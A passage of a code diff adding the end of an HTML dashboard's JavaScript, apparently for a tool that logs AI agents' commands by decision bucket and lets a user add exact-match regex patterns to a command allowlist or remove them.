+      <code data-tip="${esc(e.agent)} · ${esc(e.tool)} · ${esc((e.t || '').replace('T', ' ').slice(0, 19))}<br>${esc(e.text)}">${esc(e.text)}</code>
+      ${['blocked', 'likely', 'unsure'].includes(e.bucket) ? `<button class="btn s" data-i="${i}" data-tip="Add this exact command to your allowlist">Allow</button>` : '<span></span>'}</div>`; }).join('');
+  document.querySelectorAll('#recent [data-i]').forEach(b => b.onclick = () => {
+    const t = r[+b.dataset.i].text; const p = '^' + t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '$';
+    if (!d.allow.includes(p)) saveAllow([...d.allow, p]); });
+}
+
+function allow(d) {
+  $('allow').innerHTML = d.allow.length ? d.allow.map((p, i) => `<span class="chip">${esc(p)}<button data-i="${i}" data-tip="Remove">×</button></span>`).join('') : `<div class="sub" style="margin-bottom:8px">Nothing allowed yet. Click “Allow” on a decision or type a pattern.</div>`;
+  document.querySelectorAll('#allow [data-i]').forEach(b => b.onclick = () => saveAllow(d.allow.filter((_, i) => i !== +b.dataset.i)));
+}
+
+$('add').onclick = () => { const v = $('pat').value.trim(); if (!v) return; try { new RegExp(v); } catch { $('pat').style.outline = '1px solid var(--ink)'; return; } $('pat').value = ''; saveAllow([...(D ? D.allow : []), v]); };
+$('reload').onclick = load;
+$('more').onclick = () => { const e = $('expert'); e.hidden = !e.hidden; $('more').textContent = e.hidden ? 'Show details' : 'Hide details'; if (!e.hidden && D) render(D); };
+load(); setTimeout(tryIt, 300);
+if (location.hash === '#details') setTimeout(() => $('more').click(), 600);
+</script>
+</body></html>
